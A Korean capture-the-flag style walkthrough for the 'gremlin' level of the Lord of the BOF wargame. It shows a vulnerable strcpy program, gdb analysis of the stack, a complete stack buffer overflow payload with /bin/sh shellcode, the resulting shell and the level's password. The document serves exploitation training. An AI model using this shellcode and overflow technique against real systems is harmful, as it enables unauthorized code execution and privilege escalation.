# gremlin

```c
[gate@localhost gate]$ cat gremlin.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - gremlin
        - simple BOF
*/

int main(int argc, char *argv[])
{
    char buffer[256];
    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }
    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);
}
```

simple bof로 공격하는 문제이다. 256바이트 크기의 buffer가 있고 딱봐도 취약해 보이는 strcpy를 쓰고있다.

먼저 공격을 위해서 파일을 복사한다. 

```bash
[gate@localhost gate]$ cp gremlin attackme
[gate@localhost gate]$ ls
attackme  gremlin  gremlin.c
```

다음으로 gdb로 attackme를 열어서 main을 확인하면 다음과 같다.

```bash
[gate@localhost gate]$ gdb attackme
GNU gdb 19991004
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux"...
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
0x8048430 <main>:       push   %ebp
0x8048431 <main+1>:     mov    %ebp,%esp
0x8048433 <main+3>:     sub    %esp,0x100
0x8048439 <main+9>:     cmp    DWORD PTR [%ebp+8],1
0x804843d <main+13>:    jg     0x8048456 <main+38>
0x804843f <main+15>:    push   0x80484e0
0x8048444 <main+20>:    call   0x8048350 <printf>
0x8048449 <main+25>:    add    %esp,4
0x804844c <main+28>:    push   0
0x804844e <main+30>:    call   0x8048360 <exit>
0x8048453 <main+35>:    add    %esp,4
0x8048456 <main+38>:    mov    %eax,DWORD PTR [%ebp+12]
0x8048459 <main+41>:    add    %eax,4
0x804845c <main+44>:    mov    %edx,DWORD PTR [%eax]
0x804845e <main+46>:    push   %edx
0x804845f <main+47>:    lea    %eax,[%ebp-256]
0x8048465 <main+53>:    push   %eax
0x8048466 <main+54>:    call   0x8048370 <strcpy>
0x804846b <main+59>:    add    %esp,8
0x804846e <main+62>:    lea    %eax,[%ebp-256]
0x8048474 <main+68>:    push   %eax
0x8048475 <main+69>:    push   0x80484ec
0x804847a <main+74>:    call   0x8048350 <printf>
0x804847f <main+79>:    add    %esp,8
0x8048482 <main+82>:    leave
0x8048483 <main+83>:    ret
```

main문에 breakpoint를 걸고 NULL값을 던져 esp의 위치(buffer)를 확이하면 

```bash
(gdb) b *main
Breakpoint 1 at 0x8048430
(gdb) r `python -c 'print "\x90"*100'`
Starting program: /home/gate/attackme `python -c 'print "\x90"*100'`

Breakpoint 1, 0x8048430 in main ()
(gdb) x/200x $esp
0xbffffb0c:     0x400309cb      0x00000002      0xbffffb54      0xbffffb60
0xbffffb1c:     0x40013868      0x00000002      0x08048380      0x00000000
0xbffffb2c:     0x080483a1      0x08048430      0x00000002      0xbffffb54
0xbffffb3c:     0x080482e0      0x080484bc      0x4000ae60      0xbffffb4c
0xbffffb4c:     0x40013e90      0x00000002      0xbffffc40      0xbffffc54
0xbffffb5c:     0x00000000      0xbffffcb9      0xbffffcdb      0xbffffce5
0xbffffb6c:     0xbffffcf3      0xbffffd12      0xbffffd1f      0xbffffd37
0xbffffb7c:     0xbffffd51      0xbffffd5c      0xbffffd6a      0xbffffdaa
0xbffffb8c:     0xbffffdba      0xbffffdcf      0xbffffddf      0xbffffde9
0xbffffb9c:     0xbffffe05      0xbffffe10      0xbffffe1d      0xbffffe25
0xbffffbac:     0x00000000      0x00000003      0x08048034      0x00000004
0xbffffbbc:     0x00000020      0x00000005      0x00000006      0x00000006
0xbffffbcc:     0x00001000      0x00000007      0x40000000      0x00000008
0xbffffbdc:     0x00000000      0x00000009      0x08048380      0x0000000b
0xbffffbec:     0x000001f4      0x0000000c      0x000001f4      0x0000000d
0xbffffbfc:     0x000001f4      0x0000000e      0x000001f4      0x00000010
0xbffffc0c:     0x0fabfbff      0x0000000f      0xbffffc3b      0x00000000
0xbffffc1c:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc2c:     0x00000000      0x00000000      0x00000000      0x69000000
0xbffffc3c:     0x00363836      0x6d6f682f      0x61672f65      0x612f6574
0xbffffc4c:     0x63617474      0x00656d6b      0x90909090      0x90909090
0xbffffc5c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc6c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc7c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc8c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc9c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffcac:     0x90909090      0x90909090      0x90909090      0x53454c00
0xbffffcbc:     0x45504f53      0x2f7c3d4e      0x2f727375      0x2f6e6962
0xbffffccc:     0x7373656c      0x65706970      0x2068732e      0x55007325
0xbffffcdc:     0x4e524553      0x3d454d41      0x53494800      0x5a495354
0xbffffcec:     0x30313d45      0x48003030      0x4e54534f      0x3d454d41
0xbffffcfc:     0x61636f6c      0x736f686c      0x6f6c2e74      0x646c6163
0xbffffd0c:     0x69616d6f      0x4f4c006e      0x4d414e47      0x61673d45
0xbffffd1c:     0x52006574      0x544f4d45      0x534f4845      0x39313d54
0xbffffd2c:     0x36312e32      0x34372e38      0x4d00312e      0x3d4c4941
0xbffffd3c:     0x7261762f      0x6f70732f      0x6d2f6c6f      0x2f6c6961
0xbffffd4c:     0x65746167      0x52455400      0x74783d4d      0x006d7265
0xbffffd5c:     0x54534f48      0x45505954      0x3833693d      0x41500036
0xbffffd6c:     0x2f3d4854      0x2f727375      0x61636f6c      0x69622f6c
0xbffffd7c:     0x622f3a6e      0x2f3a6e69      0x2f727375      0x3a6e6962
0xbffffd8c:     0x7273752f      0x3131582f      0x622f3652      0x2f3a6e69
0xbffffd9c:     0x656d6f68      0x7461672f      0x69622f65      0x4f48006e
0xbffffdac:     0x2f3d454d      0x656d6f68      0x7461672f      0x4e490065
0xbffffdbc:     0x52545550      0x652f3d43      0x692f6374      0x7475706e
0xbffffdcc:     0x53006372      0x4c4c4548      0x69622f3d      0x61622f6e
0xbffffddc:     0x55006873      0x3d524553      0x65746167      0x53414200
0xbffffdec:     0x4e455f48      0x682f3d56      0x2f656d6f      0x65746167
0xbffffdfc:     0x61622e2f      0x63726873      0x4e414c00      0x6e653d47
0xbffffe0c:     0x0053555f      0x5954534f      0x4c3d4550      0x78756e69
0xbffffe1c:     0x4c485300      0x313d4c56      0x5f534c00      0x4f4c4f43

```

\x90이 들어가 있는 0xbffffc54번 부터  buffer가 시작됨을 알 수 있다. 

따라서 buffer에 쉘코드를 넣어주고 return 주소 부분에 buffer의 시작 주소를 넣어주면서 나머지를 쓰레기 값 혹은 NULL값으로 채워주면 자연스레 쉘코드가 실행될 것이다.

여기서는 buffer는 256bytes이고, sfp가 4bytes 그리고 ret이 존재하므로 buffer와 sfp를 더한 260bytes만큼에 쉘코드와 NULL값을 넣어 실행시킨다.(bash는 \xff를 NULL값으로 인식할 수 있으니 bash2를 사용하자)

```bash
[gate@localhost gate]$ bash2
[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x54\xfc\xff\xbf"'`
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒▒°
                             ̀T▒▒▒
bash$ whoami
gremlin
bash$ my-pass
euid = 501
hello bof world
```

gremlin의 password는 hello bof world이다.

